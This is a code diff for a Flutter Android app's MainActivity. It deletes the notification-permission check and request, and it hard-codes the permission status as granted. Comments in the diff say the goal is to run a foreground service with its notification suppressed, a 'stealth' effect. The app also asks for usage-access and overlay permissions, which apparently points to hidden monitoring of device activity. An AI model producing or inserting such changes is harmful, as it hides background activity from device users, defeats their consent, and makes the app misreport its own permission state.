@@ -36,14 +36,10 @@ class MainActivity : FlutterActivity() {
                         startActivity(intent)
                         result.success(false)
                     } else {
-                        if (Build.VERSION.SDK_INT >= 33) {
-                            val granted = checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
-                            if (!granted) {
-                                requestPermissions(arrayOf(Manifest.permission.POST_NOTIFICATIONS), 1001)
-                                result.success(false)
-                                return@setMethodCallHandler
-                            }
-                        }
+                        // Removed POST_NOTIFICATIONS check to prevent user prompt
+                        // On Android 13+, if permission is not granted, the notification is suppressed automatically
+                        // but the service still runs in foreground. This achieves the "stealth" effect.
+                        
                         if (!hasUsageAccess()) {
                             startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
                             result.success(false)
@@ -93,11 +89,7 @@ class MainActivity : FlutterActivity() {
                 "checkPermissions" -> {
                     val overlay = Settings.canDrawOverlays(this)
                     val usage = hasUsageAccess()
-                    val notification = if (Build.VERSION.SDK_INT >= 33) {
-                        checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
-                    } else {
-                        true
-                    }
+                    val notification = true // No longer needed
                     val map = mapOf(
                         "overlay" to overlay,
                         "usage" to usage,
